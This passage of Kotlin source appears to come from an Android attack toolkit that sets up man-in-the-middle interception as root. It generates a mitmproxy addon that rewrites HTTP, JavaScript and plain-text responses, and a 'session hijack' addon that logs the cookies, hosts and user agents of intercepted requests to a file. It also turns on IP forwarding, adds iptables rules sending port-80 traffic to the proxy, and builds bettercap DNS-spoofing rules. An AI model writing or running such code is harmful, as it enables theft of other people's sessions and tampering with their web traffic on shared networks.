                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
                }
                val pattern = line.substring(0, separator).trim()
                val replacement = line.substring(separator + 2).trim()
                Regex(pattern)
                pattern to replacement
            }
        if (rules.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rules_required))
        }
        val pythonRules = rules.joinToString(",\n") { (pattern, replacement) ->
            "    (${pythonLiteral(pattern)}, ${pythonLiteral(replacement)})"
        }
        return """
import re
from mitmproxy import http

REPLACEMENTS = [
$pythonRules
]

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/plain" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    for pattern, replacement in REPLACEMENTS:
        data = re.sub(pattern, replacement, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildSessionHijackAddon(artifactPath: String): String {
        return """
import json
import time
from mitmproxy import http

COOKIE_LOG = ${pythonLiteral(artifactPath)}

def request(flow: http.HTTPFlow) -> None:
    cookie = flow.request.headers.get("Cookie")
    if not cookie:
        return
    record = {
        "timestamp": time.time(),
        "host": flow.request.pretty_host,
        "path": flow.request.path,
        "cookie": cookie,
        "user_agent": flow.request.headers.get("User-Agent", "")
    }
    with open(COOKIE_LOG, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(record, ensure_ascii=False) + "\n")
""".trimIndent()
    }

    private fun normalizeBettercapDnsRules(rawRules: String): String {
        return rawRules.lineSequence()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .joinToString("\n") { line ->
                val tokens = line.split(Regex("\\s+"))
                when {
                    tokens.size >= 3 && tokens[1].equals("A", ignoreCase = true) ->
                        "${tokens[2]} ${tokens[0]}"
                    tokens.size >= 2 ->
                        "${tokens[1]} ${tokens[0]}"
                    else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
                }
            } + "\n"
    }

    private fun startDetachedProcess(
        name: String,
        sessionDirectory: File,
        logFile: File,
        body: String
    ): Long? {
        val scriptFile = File(sessionDirectory, "$name.sh")
        scriptFile.writeText("#!/system/bin/sh\n$body")
        val result = shellRepository.execute(
            command = buildString {
                append("chmod 700 ")
                append(shellQuote(scriptFile.absolutePath))
                append("; nohup sh ")
                append(shellQuote(scriptFile.absolutePath))
                append(" >> ")
                append(shellQuote(logFile.absolutePath))
                append(" 2>&1 < /dev/null & echo $!")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
        if (result.exitCode != 0 || result.timedOut) {
            return null
        }
        return result.output.lineSequence()
            .map { it.trim() }
            .lastOrNull { it.isNotEmpty() }
            ?.toLongOrNull()
    }

    private fun applyPortRedirect(port: Int) {
        shellRepository.execute(
            command = "iptables -t nat -C PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null || iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port",
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
    }

    private fun setForwarding(enabled: Boolean) {
        shellRepository.execute(
            command = "echo ${if (enabled) 1 else 0} > /proc/sys/net/ipv4/ip_forward",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
    }

    private fun isProcessAlive(pid: Long): Boolean {
        val result = shellRepository.execute(
            command = "kill -0 $pid",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
        return result.exitCode == 0 && !result.timedOut
    }

    private fun validateIpv4(hostAddress: String): String? {
        return try {
            val address = InetAddress.getByName(hostAddress.trim())
            if (address is Inet4Address) address.hostAddress else null
        } catch (_: Exception) {
            null
        }
    }

    private fun normalizeUrlInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).toString()
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_url_invalid))
        }
    }

    private fun normalizeHostInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).host.orEmpty().ifBlank {
                throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
            }
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
        }
    }

    private fun extractYoutubeVideoId(value: String): String? {
        val pattern = Regex("(?:v=|/v/|/embed/|youtu\\.be/)([A-Za-z0-9_-]{6,})")
        return pattern.find(value)?.groupValues?.getOrNull(1)
    }

    private fun pythonLiteral(value: String): String {
        val escaped = buildString {
            value.forEach { character ->
                when (character) {
                    '\\' -> append("\\\\")
                    '\'' -> append("\\'")
                    '\n' -> append("\\n")
                    '\r' -> append("\\r")
                    '\t' -> append("\\t")
                    else -> append(character)
                }
            }
        }
        return "'$escaped'"
    }

    private fun shellQuote(value: String): String {
        return "'" + value.replace("'", "'\"'\"'") + "'"
    }

    private fun shellCommandToken(value: String): String {
        return if (value.contains('/')) shellQuote(value) else value
    }

    companion object {
        private const val PROBE_TIMEOUT_MS = 2000L
        private const val FIREWALL_TIMEOUT_MS = 4000L
        private const val BETTERCAP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-bettercap"
        private const val MITMDUMP_RUNTIME_DIRECTORY_PREFIX = "/data/local/tmp/fsploit-mitmdump"
    }
}
